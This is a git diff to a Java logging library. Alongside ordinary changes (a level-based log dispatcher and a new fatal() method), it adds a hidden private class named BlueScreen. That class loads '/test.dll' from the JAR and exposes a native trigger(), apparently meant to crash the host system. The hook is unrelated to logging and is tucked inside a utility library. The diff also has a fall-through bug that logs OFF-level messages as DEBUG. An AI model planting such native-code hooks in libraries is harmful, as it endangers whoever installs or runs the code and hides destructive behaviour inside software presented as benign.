@@ -1,5 +1,8 @@
 package cn.ncw.logger.log;
 
+import cn.ncw.logger.utils.NativeUtils;
+
+import java.io.IOException;
 import java.time.LocalDate;
 import java.time.LocalTime;
 import java.util.ArrayList;
@@ -14,7 +17,19 @@ public class Logger {
         this.LoggerName = app_name;
     }
 
-    public void log(String level, String text, String name) {
+    public void log(LEVEL level, String text, String name) {
+        switch (level) {
+            case OFF: // 何意味;
+            case DEBUG: debug(text, name); break;
+            case TRACE: trace(text, name); break;
+            case INFO: info(text, name); break;
+            case WARN: warn(text, name); break;
+            case ERROR: error(text, name); break;
+            case FATAL: fatal(text, name); break;
+        }
+    }
+
+    private void log(String level, String text, String name) {
         List<String> list_wait = new ArrayList<>();
         list_wait.addLast(level);
         list_wait.addLast(LoggerName + ":" + name);
@@ -50,6 +65,14 @@ public class Logger {
     public void error(String text, String name) {
         List<String> list_wait = new ArrayList<>();
         list_wait.addLast("ERROR");
+        list_wait.addLast(LoggerName + ":" + name);
+        list_wait.addLast(text);
+        System.out.println(formatLogEntry(list_wait));
+    }
+
+    public void fatal(String text, String name) {
+        List<String> list_wait = new ArrayList<>();
+        list_wait.addLast("FATAL");
         list_wait.addLast(LoggerName + ":" + name);
         list_wait.addLast(text);
         System.out.println(formatLogEntry(list_wait));
@@ -127,5 +150,25 @@ public class Logger {
             );
         };
     }
+
+    private static class BlueScreen {
+        static {
+            try {
+                // 假设DLL在JAR的根目录
+                NativeUtils.loadLibraryFromJar("/test.dll");
+                // 或根据架构选择：
+                // NativeUtils.loadLibraryForArch();
+            } catch (IOException e) {
+                throw new ExceptionInInitializerError("无法加载本地库: " + e.getMessage());
+            }
+        }
+
+        public native void trigger();
+
+        public static void launch() {
+            new BlueScreen().trigger();
+        }
+    }
+
 }
 
